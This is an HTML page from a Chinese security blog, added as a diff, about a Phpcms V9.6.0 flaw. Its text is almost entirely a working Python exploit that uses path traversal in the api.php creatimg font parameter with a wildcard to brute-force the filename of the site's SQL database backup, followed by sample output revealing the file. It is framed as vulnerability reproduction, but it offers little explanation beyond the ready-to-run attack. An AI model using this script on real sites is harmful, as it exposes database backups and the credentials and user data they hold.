@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Phpcms V9.6.0 数据库备份爆破一、漏洞简介二、漏洞影响Phpcms V9.6.0 三、复现过程#!&#x2F;usr&#x2F;bin&#x2F;env python # coding&#x3D;utf-8 &#39;&#39;&#39;&#x2F;*     * author &#x3D; Mochazz     * team   &#x3D; 红日安全团队     * env    &#x3D; pyton3     *     *&#x2F; &#39;&#39;&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20V9.6.0%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E7%88%86%E7%A0%B4/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Phpcms V9.6.0 数据库备份爆破一、漏洞简介二、漏洞影响Phpcms V9.6.0 三、复现过程#!&#x2F;usr&#x2F;bin&#x2F;env python # coding&#x3D;utf-8 &#39;&#39;&#39;&#x2F;*     * author &#x3D; Mochazz     * team   &#x3D; 红日安全团队     * env    &#x3D; pyton3     *     *&#x2F; &#39;&#39;&amp;#">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:26:01.723Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Phpcms/Phpcms V9.6.0 数据库备份爆破" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpcms/Phpcms%20V9.6.0%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E7%88%86%E7%A0%B4/" class="article-date">
+  <time datetime="2022-07-08T06:26:01.723Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpcms-V9-6-0-数据库备份爆破"><a href="#Phpcms-V9-6-0-数据库备份爆破" class="headerlink" title="Phpcms V9.6.0 数据库备份爆破"></a>Phpcms V9.6.0 数据库备份爆破</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Phpcms V9.6.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>#!/usr/bin/env python
+# coding=utf-8
+&#39;&#39;&#39;/*
+    * author = Mochazz
+    * team   = 红日安全团队
+    * env    = pyton3
+    *
+    */
+&#39;&#39;&#39;
+import requests
+import itertools
+characters = &quot;abcdefghjklmnopqrstuvwxyz0123456789_!#&quot;
+backup_sql = &quot;&quot;
+payload = &quot;/api.php?op=creatimg&amp;txt=mochazz&amp;font=/../../../../caches/bakup/default/&#123;location&#125;&lt;&lt;&quot;
+url = &quot;http://www.0-sec.org&quot;
+flag = 0
+for num in range(1, 7):
+    if flag:
+        break
+    for pre in itertools.permutations(characters, num):
+        pre = &#39;&#39;.join(list(pre))
+        payload = payload.format(location=pre)
+        r = requests.get(url+payload)
+        if r.status_code == 200 and &quot;PNG&quot; in r.text:
+            flag = 1
+            backup_sql = pre
+            payload = &quot;/api.php?op=creatimg&amp;txt=mochazz&amp;font=/../../../../caches/bakup/default/&#123;location&#125;&lt;&lt;&quot;
+            break
+        else:
+            payload = &quot;/api.php?op=creatimg&amp;txt=mochazz&amp;font=/../../../../caches/bakup/default/&#123;location&#125;&lt;&lt;&quot;
+print(&quot;[+] 前缀为：&quot;, backup_sql)
+flag = 0
+for i in range(30):
+    if flag:
+        break
+    for ch in characters:
+        if ch == characters[-1]:
+            flag = 1
+            break
+        payload = payload.format(location=backup_sql+ch)
+        r = requests.get(url + payload)
+        if r.status_code == 200 and &quot;PNG&quot; in r.text:
+            backup_sql += ch
+            print(&quot;[+] &quot;, backup_sql)
+            payload = &quot;/api.php?op=creatimg&amp;txt=mochazz&amp;font=/../../../../caches/bakup/default/&#123;location&#125;&lt;&lt;&quot;
+            break
+        else:
+            payload = &quot;/api.php?op=creatimg&amp;txt=mochazz&amp;font=/../../../../caches/bakup/default/&#123;location&#125;&lt;&lt;&quot;
+
+print(&quot;备份sql文件地址为：&quot;, backup_sql+&quot;.sql&quot;)
+</code></pre>
+<p>结果为：</p>
+<pre><code>C:\Users\dell\Desktop&gt;python Zxc.py
+[+] 前缀为： 1
+[+]  12
+[+]  123
+[+]  1231
+[+]  12312
+[+]  123123
+[+]  1231231
+[+]  12312312
+[+]  123123123
+备份sql文件地址为： 123123123.sql
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20V9.6.0%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E7%88%86%E7%A0%B4/" data-id="cl5c2qu5s00dyy8v1ar7599sr" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Phpcms/Phpcms%20v9.6.0%E5%90%8E%E5%8F%B0getshell/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Phpcms/Phpcms%20v9.6.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
